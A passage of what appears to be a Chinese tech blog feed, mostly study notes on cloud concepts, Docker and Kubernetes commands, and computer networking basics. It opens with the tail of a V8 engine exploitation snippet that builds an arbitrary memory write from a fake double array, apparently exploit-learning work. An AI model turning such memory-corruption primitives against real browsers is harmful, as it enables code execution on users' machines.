(0x00000002n &lt;&lt; 32n));       fake_double_array[0] = u2d(value);   &#125;       let a = [1, 2, 3, 4];       % DebugPrint(a);       arbitrary_offset_write(offset_of(a), 0xdeadbeefn);           // % DebugPrint(oob_array);   // console.log(hex(offset_of(oob_array)));       % SystemBreak();</code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240713212650.png"></p></li></ol></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>云原生实战-Docker+K8s</title>
      <link href="/Docker+K8s/"/>
      <url>/Docker+K8s/</url>
      
        <content type="html"><![CDATA[<h1 id="云平台核心"><a href="#云平台核心" class="headerlink" title="云平台核心"></a>云平台核心</h1><h2 id="公有云"><a href="#公有云" class="headerlink" title="公有云"></a>公有云</h2><ol><li>  公有云资源（服务器、存储空间）由<strong>第三方云服务商</strong>运营</li><li>  通过Internet提供</li><li>  在公有云中，与其它组织或<strong>云“用户”</strong> <strong>共享相同的硬件、存储和网络设备</strong></li><li>  优势：<strong>近乎无限性的缩放性</strong>，提供按需资源，可满足业务需求</li></ol><h2 id="私有云"><a href="#私有云" class="headerlink" title="私有云"></a>私有云</h2><ol><li>  私有云由<strong>专供一个企业或组织</strong>使用的<strong>云计算资源</strong>构成</li><li>  服务和基础结构始终在私有网络上进行维护</li><li>  私有云使用对象：政府机构、金融机构、<strong>具备业务关键性运营</strong>且希望<strong>对环境拥有更大控制权</strong>的大型组织</li><li>  更高的<strong>隐私</strong>级别</li></ol><h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><ol><li>  <strong>云服务器</strong>作为应用的<strong>最终载体</strong></li><li>  <strong>VPC</strong>为所有的云服务器提供<strong>网络隔离</strong>：在物理层做网络隔离</li><li>  <strong>安全组</strong>控制每个服务器的防火规则</li><li>  <strong>公网IP</strong>使得资源<strong>可访问</strong></li><li>  <strong>端口转发</strong>的方式<strong>访问到具体服务器</strong></li></ol><h2 id="什么是VPC"><a href="#什么是VPC" class="headerlink" title="什么是VPC"></a>什么是VPC</h2><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240409193348.png"></li><li>  VPC: virtual private cloud，<strong>虚拟私有云</strong>，用户在公共云上申请的<strong>隔离的、私密的虚拟网络环境</strong></li><li>  用户可以自由配置VPC内的IP地址段、子网、安全组等子服务，也可以申请弹性带宽和弹性IP搭建业务服务 </li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240409193841.png"></li><li>  经典网络：公有云上所有<strong>用户共享公共网络资源池</strong>，用户之间<strong>未做逻辑隔离</strong>，用户的IP由系统统一分配，不同用户的IP不同</li><li>  VPC：在公有云上为用户建立一块<strong>逻辑隔离的虚拟网络空间</strong>，</li></ol><h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><h2 id="Docker-VPS-ECS的区别"><a href="#Docker-VPS-ECS的区别" class="headerlink" title="Docker-VPS-ECS的区别"></a>Docker-VPS-ECS的区别</h2><ol><li>  VPS： Virtual Private Server 虚拟专用服务器  将物理服务器分割成多个虚拟机，与笔记本上用Vmware和VirtualBox建立的虚拟机是一回事，不支持自主升降级，不具有弹性</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240410115549.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240410115627.png"></li><li>  ECS： Elastic Computer Service 弹性计算服务，用户可以根据需要弹性选择服务器CPU、内存、带宽等</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240410115712.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240410115812.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240410163535.png"></li><li>  相当于在ECS中再运行一个虚拟机，非常笨重</li><li>  Docker容器中只有应用、依赖库和配置，并没有操作系统</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240410163634.png"></li><li>  总的来说：物理机跑ECS，ECS跑Docker容器，多个Docker容器共享一个操作系统，使用操作系统内核</li></ol><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><ol><li>  比如：你写了一个web应用程序，想要发给朋友或者部署到远程云服务器上</li><li>  首先需要配置相关的运行环境，例如数据库、web服务器</li><li>  还不一定能运行，因为别人可能用的是完全不同的操作系统，就算是Linux系统，也会因为不同的发行版本而导致运行环境不同</li><li>  为了模拟完全相同的本地开发环境，自然会想到使用虚拟机，但是虚拟机需要模拟硬件，还需要包含操作系统，不仅体积臃肿内存占用高</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240409202219.png"></li><li>  docker不去模拟底层的硬件，建立在操作系统之上，只为每一个应用提供完全隔离的运行环境（container）</li></ol><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="Image-镜像"><a href="#Image-镜像" class="headerlink" title="Image 镜像"></a>Image 镜像</h3><ol><li>  Image镜像：类似于<strong>虚拟机的快照</strong>，里面包含了要部署的应用程序和所关联的所有库</li><li>  Docker的Image镜像是一个<strong>特殊的文件系统</strong></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240409202945.png"></li></ol><h3 id="Container-容器"><a href="#Container-容器" class="headerlink" title="Container 容器"></a>Container 容器</h3><ol><li>  通过镜像，可以创建多个不同的container容器</li><li>  这里的<strong>容器就像是一台台运行起来的虚拟机</strong>，里面运行了应用程序</li><li>  每一个容器是<strong>独立运行</strong>的，container容器之间互不影响</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240409203956.png"></li><li>  镜像Image和容器Container的关系，就像是面向对象程序设计中的类和实例一样，<strong>镜像是静态的定义</strong>，<strong>容器是镜像运行时的实体</strong></li></ol><h3 id="Dockerfile-自动化脚本"><a href="#Dockerfile-自动化脚本" class="headerlink" title="Dockerfile 自动化脚本"></a>Dockerfile 自动化脚本</h3><ol><li><p>  Dockerfile类似于一种自动化脚本，主要被用来创建之前讲到的镜像</p></li><li><p>  过程好比在虚拟机中安装操作系统和软件一样</p></li><li><p>在docker hub中引入基础镜像、环境，使用FROM命令</p>  <pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM python:3.8-slim-buster # FROM 应用:版本（tag）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>指定所有Docker命令的工作路径</p>  <pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">WORKDIR &#x2F;app<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>使用COPY命令将所有的程序拷贝到Docker镜像中，**.** 代表根目录下的所有文件，第二个参数代表Docker镜像中的路径</p>  <pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">COPY . . COPY &lt;本地路径&gt; &lt;目标路径&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>RUN</strong>允许在<strong>创建镜像</strong>时<strong>运行任意的shell命令</strong></p>  <pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">RUN pip install -r xxx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>CMD</strong>指定当<strong>Docker容器运行起来以后</strong>要执行的命令（镜像是静态的定义，容器是程序运行的实体）</p>  <pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">CMD [&#39;python3&#39;,&quot;app.py&quot;]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="仓库"><a href="#仓库" class="headerlink" title="仓库"></a>仓库</h3><ol><li>  镜像构建完成后，可以很容易地在宿主机上运行</li><li>  但是，如果需要<strong>在其它服务器上使用这个镜像</strong>，我们需要<strong>集中的存储、分发镜像的服务</strong></li><li>  标签：把版本信息，如果不用如下格式指定版本（标签），将以latest作为默认标签</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240409204837.png"></li></ol><h2 id="操作命令实战"><a href="#操作命令实战" class="headerlink" title="操作命令实战"></a>操作命令实战</h2><h3 id="面向单个容器"><a href="#面向单个容器" class="headerlink" title="面向单个容器"></a>面向单个容器</h3><ol><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240410105418.png"></p></li><li><p>创建镜像</p>  <pre class="line-numbers language-none"><code class="language-none">docker build -t 镜像的名字 目录<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>启动容器，-p参数会将容器上的某一个端口，映射到你的本地主机上，容器端口：映射主机端口</p>  <pre class="line-numbers language-none"><code class="language-none">docker run -p 80:5000 -d my-finance<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  可以使用DockerDesktop来可视化地查看应用在后台的输出，与各种容器的信息</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240410103602.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240410103632.png"></p></li><li><p>  volume卷用来永久保存数据</p></li><li><p>  对镜像的拉取查看等操作</p></li><li><p>```bash<br>  docker pull nginx:1.20.1 #拉包,镜像名:版本名(标签)<br>  docker images #查看所有的镜像<br>  docker rmi 镜像名:版本号 # 删除镜像</p>  <pre class="line-numbers language-none"><code class="language-none">9.   对容器的运行、修改映射端口等操作     &#96;&#96;&#96;bash     docker run #镜像启动     docker run --name&#x3D;mynginx -d --restart&#x3D;always -p 80:80 nginx          docker ps #查看正在运行的容器     docker ps -a          docker rm 容器id #删除停止的容器     docker rm -f mynginx          docker stop 容器id #停止容器          docker start 容器id # 再次启动          docker update 容器id --restart&#x3D;always #应用开机自启<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>修改容器内容</p>  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 进入容器内部修改</span>docker <span class="token builtin class-name">exec</span> -it 容器id /bin/bash<span class="token comment"># 挂载数据到外部修改</span>docker run --name<span class="token operator">=</span>mynginx -d --restart<span class="token operator">=</span>always -p <span class="token number">80</span>:80 -v /data/html:/usr/share/nginx/html:ro nginx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>提交改变，将自己修改好的镜像提交</p>  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">docker commit <span class="token punctuation">[</span>OPTIONS<span class="token punctuation">]</span> CONTAINER <span class="token punctuation">[</span>REPOSITORY<span class="token punctuation">[</span>:TAG<span class="token punctuation">]</span><span class="token punctuation">]</span>docker commit -a <span class="token string">"leifengyang"</span>  -m <span class="token string">"首页变化"</span> 341d81f7504f guignginx:v1.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="docker-compose工具"><a href="#docker-compose工具" class="headerlink" title="docker-compose工具"></a>docker-compose工具</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">docker compose up <span class="token comment"># 用于启动应用程序的服务，如果在命令中不带任何参数，将根据docker-compose.yml文件启动所有服务</span>docker compose up service1 service2 <span class="token comment">#启动某个服务，可以在命令后面指定服务名</span>docker compose down <span class="token comment"># 停止应用程序的服务，并移除关联的网络和容器</span>docker-compose build: 这个命令用于构建应用程序的服务，根据 docker-compose.yml 中定义的配置。它会构建每个服务的 Docker 镜像，以便后续的 docker-compose up 命令可以使用。例如：docker-compose builddocker-compose start: 这个命令用于启动已经停止的服务，但不会重新构建它们。例如：docker-compose startdocker-compose stop: 这个命令用于停止正在运行的服务，但不会移除相关的容器或网络。例如：docker-compose stopdocker-compose restart: 这个命令用于重启正在运行的服务，等同于执行 docker-compose stop 和 docker-compose start。例如：docker-compose restartdocker-compose ps: 这个命令用于列出所有由 docker-compose.yml 文件定义的服务，并显示它们的状态。例如：docker-compose <span class="token function">ps</span>docker-compose logs: 这个命令用于查看服务的日志输出。可以使用 -f 选项来实时查看日志。例如：docker-compose logs -fdocker-compose exec: 这个命令用于在服务的容器中执行命令。可以使用该命令连接到正在运行的服务，并在其中执行特定的命令。例如：docker-compose <span class="token builtin class-name">exec</span> service_name <span class="token builtin class-name">command</span>docker-compose down --volumes: 在执行 docker-compose down 时，使用 --volumes 选项可以移除关联的数据卷。这将会移除所有由 docker-compose 创建的数据卷。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="面向多个容器，多个容器共同协作"><a href="#面向多个容器，多个容器共同协作" class="headerlink" title="面向多个容器，多个容器共同协作"></a>面向多个容器，多个容器共同协作</h3><ol><li>  比如：使用一个容器来部署web应用，另一个容器运行数据库系统</li><li>  容器2中的数据库系统为容器1中的web应用提供数据，做到数据与应用逻辑的有效分离</li><li>  比如当web应用宕机了，数据库仍然在有效运转</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240410104651.png"></li><li>  Kubernetes将各个容器分发到一个集群cluster上运行，做到负载均衡</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240410104938.png"></li></ol><h1 id="Kubernetes"><a href="#Kubernetes" class="headerlink" title="Kubernetes"></a>Kubernetes</h1><h2 id="K8s最精简的定义"><a href="#K8s最精简的定义" class="headerlink" title="K8s最精简的定义"></a>K8s最精简的定义</h2><ol><li>  K8s 为你提供了一个 可<strong>弹性运行</strong>的<strong>分布式系统框架</strong>（平台）,K8s会满足你的<strong>扩展要求、故障转移、部署模式</strong>等</li></ol><h2 id="K8s的架构"><a href="#K8s的架构" class="headerlink" title="K8s的架构"></a>K8s的架构</h2><pre class="line-numbers language-mathematica" data-language="mathematica"><code class="language-mathematica">Kubernetes Cluster &#x3D; N Master Node + N Worker NodeN个主节点+N个工作节点 N&gt;&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="组件架构"><a href="#组件架构" class="headerlink" title="组件架构"></a>组件架构</h3><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240410200721.png"></li></ol><h4 id="Control-Plane-Components-控制平面组件-CPC"><a href="#Control-Plane-Components-控制平面组件-CPC" class="headerlink" title="Control Plane Components 控制平面组件 CPC"></a>Control Plane Components 控制平面组件 CPC</h4><ol><li>  控制平面组件<strong>对集群做出全局决策</strong>，比如调度，以及检测和响应集群事件</li><li>  相当于Hadoop的Master节点</li><li>  若干个Node节点需要相互协调才能做到负载均衡和故障转移，这就需要一台中心计算机来集中管理</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240410201721.png"></li><li>  会实时监测节点的网络状态来平衡服务器的负载</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240410201900.png"></li><li></li></ol><h4 id="Node组件"><a href="#Node组件" class="headerlink" title="Node组件"></a>Node组件</h4><ol><li>  K8s管理着一系列的主机或服务器，这些服务器称为节点Node，Node是多个容器（Pod）的集合</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240410201358.png"></li><li>  每个节点运行着若干个相互独立的Pod，Pod是K8s中可以部署的最小执行单元</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240410201544.png"></li><li>  这么多的Pod需要相互协调才能做到负载均衡和状态转移</li><li>  节点组件在每个节点上运行，维护运行的Pod并提供K8s运行环境</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240410201223.png"></li></ol><h4 id="kubeadm创建集群"><a href="#kubeadm创建集群" class="headerlink" title="kubeadm创建集群"></a>kubeadm创建集群</h4><h4 id="Replica-Set-副本集合"><a href="#Replica-Set-副本集合" class="headerlink" title="Replica Set 副本集合"></a>Replica Set 副本集合</h4><ol><li>  当K8s发现<strong>某个容器或者Pod挂掉了</strong>，会<strong>立刻启用在后台预先准备好的</strong>、随时待命的<strong>备用容器</strong>来替换</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240410202119.png"></li></ol><h2 id="K8s操作实战"><a href="#K8s操作实战" class="headerlink" title="K8s操作实战"></a>K8s操作实战</h2><h3 id="deployment-yaml"><a href="#deployment-yaml" class="headerlink" title="deployment.yaml"></a>deployment.yaml</h3><ol><li>  Docker中，自动化部署脚本文件是dockerfile</li><li>  K8s中，自动化部署脚本文件是deployment.yaml</li><li>  内部定义了里面的Pod、里面运行了哪些容器、网络配置等 </li></ol><h3 id="通信"><a href="#通信" class="headerlink" title="通信"></a>通信</h3><ol><li>  在默认情况下，我们的Pod只能与同一个Cluster集群中的其它Pod进行通信</li><li>  虽然每个Pod都有一个独立的IP，但是这个IP地址对于外网来说是不可见的</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240410203135.png"></li><li>  如果要从外网中访问我们的Pod，就需要K8s中另一个组件：服务Service</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240410203230.png"></li></ol><h4 id="NodePort"><a href="#NodePort" class="headerlink" title="NodePort"></a>NodePort</h4><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240410203230.png"></li><li>  NodePort是原始的将应用端口暴露给外网的方式</li></ol><h3 id="Kubectl部署应用"><a href="#Kubectl部署应用" class="headerlink" title="Kubectl部署应用"></a>Kubectl部署应用</h3><ol><li><p>  Kubectl是一个全平台通用的工具</p></li><li><p>使用kubectl apply 来部署我们的应用</p>  <pre class="line-numbers language-none"><code class="language-none">kubectl apply -f deployment.yaml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  使用kubectl get pods来获取所有pod的运行状态</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240410203620.png"></p></li><li><p>  使用kubectl get services来获取之前定义的services服务</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240410203712.png"></p></li></ol><h3 id="具体操作还请见转载博客"><a href="#具体操作还请见转载博客" class="headerlink" title="具体操作还请见转载博客"></a>具体操作还请见转载博客</h3><p><a href="https://www.yuque.com/leifengyang/oncloud/ghnb83">Kubernetes基础概念 (yuque.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> 云原生 </category>
          
          <category> Docker </category>
          
          <category> K8s </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 云原生 </tag>
            
            <tag> Docker </tag>
            
            <tag> K8s </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络复习</title>
      <link href="/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%A4%8D%E4%B9%A0/"/>
      <url>/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%A4%8D%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h1><h2 id="计算机网络组成"><a href="#计算机网络组成" class="headerlink" title="计算机网络组成"></a>计算机网络组成</h2><ol><li>  硬件、软件、协议</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240401211149.png"></li><li>  网络适配器/网卡：用于通信的芯片，将主机数据发送到网络上，接收来自网络的数据 </li></ol><h2 id="网络、互联网、因特网"><a href="#网络、互联网、因特网" class="headerlink" title="网络、互联网、因特网"></a>网络、互联网、因特网</h2><ol><li>  网络是由若干节点和链接这些节点的链路组成</li><li>  internet：通用名词，泛指多个计算机网络互联而成的网络</li><li>  Internet：专用名词，当前全球最大的、开放的，由众多网络相互连接而成的特定计算机网络</li><li>  因特网服务提供者：Internet Service Provider,因特网上的主机必须有IP地址才能通信，电信、联通、移动</li></ol><h2 id="三种交换方式"><a href="#三种交换方式" class="headerlink" title="三种交换方式"></a>三种交换方式</h2><p>###电路交换</p><ol><li><p>  两两通信节点之间需要一根链路，共需要(n-1)*n/2</p></li><li><p>  后采用电路交换机，每一部电话都连接到电话交换机上，有多个开关的开关器 </p></li><li><p>  电话交换机连通电话线的方法称为电路交换</p></li><li><p>  从通信资源分配的角度来看，交换是按照某种方式动态分配传输线路的资源</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240401205249.png"></p></li><li><p>   电路交换的三个步骤：</p></li></ol><pre><code> <pre class="line-numbers language-none"><code class="language-none">1. 建立连接：分配通信资源2. 通话：一直占用通信资源3. 释放连接：归还通信资源<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></code></pre><h3 id="分组交换"><a href="#分组交换" class="headerlink" title="分组交换"></a>分组交换</h3><ol><li>  计算机网络一般采用分组交换</li><li>   分组交换机：路由器，负责将各种网络连接起来，并对接收到的分组进行转发，即分组交换</li><li>  分组乱序：分组到达目的站点的顺序不一定与分组在源站的发送顺序相同</li><li>  各个分组从源站到目的站可以走不同的路径</li><li>  路由器：存储转发，缓存分组，转发分组</li></ol><h3 id="电路交换、报文交换、分组交换的对比"><a href="#电路交换、报文交换、分组交换的对比" class="headerlink" title="电路交换、报文交换、分组交换的对比"></a>电路交换、报文交换、分组交换的对比</h3><ol><li>  <a href="https://blog.csdn.net/hyl1181/article/details/111692587">电路交换、报文交换、分组交换的区别与优缺点_电路交换,报文交换和分组交换的优缺点-CSDN博客</a></li></ol><h3 id="什么是存储转发"><a href="#什么是存储转发" class="headerlink" title="什么是存储转发"></a>什么是存储转发</h3><ol><li>  在每个中间节点，数据包首先被完全接收并存储在缓存中</li><li>  然后根据目标地址和路由选择算法确定下一个节点，数据包被转发到下一个节点。</li><li>  存储转发保证了数据包的完整性和可靠性。</li></ol><h2 id="覆盖范围分类"><a href="#覆盖范围分类" class="headerlink" title="覆盖范围分类"></a>覆盖范围分类</h2><ol><li>  广域网WAN</li><li>  城域网MAN</li><li>  局域网LAN</li><li>  个域网PAN</li></ol><h2 id="性能指标：速率、带宽、吞吐量"><a href="#性能指标：速率、带宽、吞吐量" class="headerlink" title="性能指标：速率、带宽、吞吐量"></a>性能指标：速率、带宽、吞吐量</h2><h3 id="速率"><a href="#速率" class="headerlink" title="速率"></a>速率</h3><ol><li>  速率即数据传输的速率</li><li>  连接在计算机网络上的主机在数字信道上传送数据位数的速率</li><li>  单位 b/s kb/s Mb/s Gb/s Tb/s</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240401213912.png"></li><li>  表示速率时，进制10的三次方</li><li>  表示存储容量时，进制2的10次方</li></ol><h3 id="带宽"><a href="#带宽" class="headerlink" title="带宽"></a>带宽</h3><ol><li>  带宽用来表示网络的通信线路传送数据的能力，通常是单位时间内从网络中的某一点到另一点所能通过的“<strong>最高</strong>数据率”</li><li>  单位：比特每秒</li><li>  带宽是比较理想的，<strong>在理想状态下可以达到的最大传输速率</strong></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240401215545.png"></li></ol><h3 id="吞吐量"><a href="#吞吐量" class="headerlink" title="吞吐量"></a>吞吐量</h3><ol><li>  在单位时间内，通过某个网络（或信道、或接口）的数据量</li><li>  吞吐量是<strong>实际的传输速率</strong>，单位时间内通过某个网络的<strong>实际数据量</strong></li></ol><h2 id="计算机网络的体系结构"><a href="#计算机网络的体系结构" class="headerlink" title="计算机网络的体系结构"></a>计算机网络的体系结构</h2><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240404152553.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240404152703.png"></li><li>  OSI七层体系结构：法律上的国际标准</li><li>  TCP/IP四层体系结构：事实上的，商业上的体系结构</li><li>  原理体系结构：五层，结合了OSI与TCP/IP体系结构的优点</li></ol><h3 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h3><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240404153144.png"></li><li>  怎样用信号表示0和1</li><li>  采用怎样的物理接口(常见的RJ45)</li><li>  采用怎样的传输介质</li></ol><h3 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h3><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240404153613.png"></li><li>  如何标识网络中的各主机(主机的编址问题，例如MAC地址)</li><li>  如何从信号所表示的一连串比特流中区分地址和数据（数据的封装格式问题）</li><li>  如何协调各个主机争用总线</li></ol><h3 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h3><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240404154120.png"></li><li>  点分十进制表示的IP地址：前三个十进制数标识网络，第四个十进制标识主机</li><li>  网络层主要解决：</li><li>  如何标识各个网络以及网络中的各个主机</li><li>  路由器如何转发分组，如何进行路由选择</li></ol><h3 id="运输层"><a href="#运输层" class="headerlink" title="运输层"></a>运输层</h3><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240404154832.png"></li><li>  如何解决进程之间基于网络的通信问题</li><li>  出现传输错误时，如何处理（丢包、误码）</li></ol><h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240404155046.png"></li><li>  通过应用进程间的交互来完成特定的网络应用</li></ol><h3 id="总观"><a href="#总观" class="headerlink" title="总观"></a>总观</h3><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240404155233.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240404161418.png"></li><li>  在不同的网络中进行转发时，不会涉及到运输层（不同进程之间通信）与应用层（不同应用之间）</li><li>  因此，路由器中没有运输层和应用层，只有三层：物理层、数据链路层、网络层</li></ol><h2 id="计算机网络体系结构中的专用术语"><a href="#计算机网络体系结构中的专用术语" class="headerlink" title="计算机网络体系结构中的专用术语"></a>计算机网络体系结构中的专用术语</h2><h3 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h3><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240404175136.png"></li><li>  实体：任何可发送或接收信息的硬件或软件进程</li><li>  对等实体：收发双方相同层次中的实体</li></ol><h3 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h3><ol><li>  协议：控制两个对等实体进行逻辑通信的规则的集合</li><li>  协议的三要素：</li><li>  语法：定义交换信息的格式</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240404180104.png"></li><li>  语义：定义收发双方所要完成的操作</li><li>  同步：定义收发双方的时序关系</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240404180544.png"></li></ol><h3 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h3><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240404181206.png"></li><li>  协议数据单元PDU：对等层次之间传送的数据包，称为该层的协议数据单元</li><li>  服务数据单元SDU：同一系统内，层与层之间交换的数据包称为服务数据单元</li><li>  物理层：比特流</li><li>  链路层：帧（封装成帧）</li><li>  网络层：IP数据报/分组</li><li>  运输层：TCP报文段 或 UDP用户数据报</li><li>  应用层：报文</li><li>  比特流-&gt;帧-&gt;IP数据报-&gt;TCP报文段-&gt;报文</li><li>  协议是 水平的，服务是 垂直的，两个对等实体间的逻辑通信使得本层能够向上一层提供服务</li></ol><h3 id="协议是水平的，服务是垂直的"><a href="#协议是水平的，服务是垂直的" class="headerlink" title="协议是水平的，服务是垂直的"></a>协议是水平的，服务是垂直的</h3><ol><li>  协议是水平的：协议是控制对等实体之间通信的规则</li><li>  服务是垂直的：服务是由下层向上层通过层间接口提供的</li></ol><h1 id="第二章——物理层"><a href="#第二章——物理层" class="headerlink" title="第二章——物理层"></a>第二章——物理层</h1><h2 id="通信的目的是传送消息，数据是传送消息的实体，信号是数据的电气或电磁表现"><a href="#通信的目的是传送消息，数据是传送消息的实体，信号是数据的电气或电磁表现" class="headerlink" title="通信的目的是传送消息，数据是传送消息的实体，信号是数据的电气或电磁表现"></a>通信的目的是传送消息，数据是传送消息的实体，信号是数据的电气或电磁表现</h2><h2 id="物理层下面的传输媒体"><a href="#物理层下面的传输媒体" class="headerlink" title="物理层下面的传输媒体"></a>物理层下面的传输媒体</h2><ol><li><p>  <strong>传输媒体不属于计算机网络体系中的任何一层</strong></p></li><li><p>  双绞线：</p></li><li><p>绞合的作用：</p>  <pre class="line-numbers language-none"><code class="language-none">1. 抵御部分来自外界的电磁干扰2. 减少相邻导线的电磁干扰<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>  T568B双绞线组合线序：橙白 橙 绿白 蓝 蓝白 绿 棕白 棕</p></li></ol><h2 id="传输方式"><a href="#传输方式" class="headerlink" title="传输方式"></a>传输方式</h2><h3 id="串行传输和并行传输"><a href="#串行传输和并行传输" class="headerlink" title="串行传输和并行传输"></a>串行传输和并行传输</h3><ol><li>  串行传输：发送端一次发送一个bit到数据总线上，因此发送端与接收端之间只需要一条数据传输线路</li><li>   并行传输：一次发送n个bit，发送端与接收端之间需要有n条传输线路</li><li>  在计算机网络中，远距离传输采用串行传输</li><li>  计算机内部的数据传输常采用并行传输，例如cpu与总线之间，常采用总线进行数据传输，数据总线数代表并行传输能力</li></ol><h3 id="同步传输与异步传输"><a 